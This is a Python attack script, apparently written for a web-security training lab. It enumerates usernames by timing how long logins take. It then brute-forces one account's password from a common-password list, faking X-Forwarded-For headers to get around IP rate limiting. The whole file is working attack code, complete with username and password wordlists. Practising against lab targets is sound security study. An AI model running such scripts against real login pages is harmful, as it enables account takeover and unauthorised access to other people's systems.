import random
import requests

from rich.console import Console
from rich.progress import track


USERNAMES = """
carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
autodiscover
""".strip().split("\n")


PASSWORDS = """
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
""".strip().split("\n")

console = Console()

url = "https://0a7a006a0394d51c8039d1ed00120005.web-security-academy.net/login"

def try_user(user):
    response = requests.post(
        url,
        data={
            "username": user,
            "password": "peter" * 200,
        },
        headers={
            "X-Forwarded-For": f"192.168.{random.randint(1,100)}.{random.randint(1,100)}",
        },
    )
    return response.elapsed


def try_pass(password):
    response = requests.post(
        url,
        data={
            "username": "austin",
            "password": password,
        },
        headers={
            "X-Forwarded-For": password,
        },
        allow_redirects=False,
    )
    return response.status_code

"""
times = []

with console.status("Enumerating username..."):
    for user in USERNAMES:
        elapsed = try_user(user)
        console.log(f"{elapsed}\t{user}")
        times.append((user, elapsed))

times.sort(key=lambda record: record[1])
print('\n'.join([str(t) for t in times]))


response = requests.post(
    url,
    data={
        "username": "wiener",
        "password": "peter" * 200,
    },
    headers={
        "X-Forwarded-For": str(uuid.uuid4()),
        'Cache-Control': 'no-cache',
    },
    allow_redirects=False,
)
print(response, response.elapsed)

raise Exception
"""


times = []

for password in track(PASSWORDS, console=console):
    elapsed = try_pass(password)
    console.log(f"{elapsed}\t{password}")
    times.append((password, elapsed))


times.sort(key=lambda record: record[1])
print('\n'.join([str(t) for t in times]))
#"""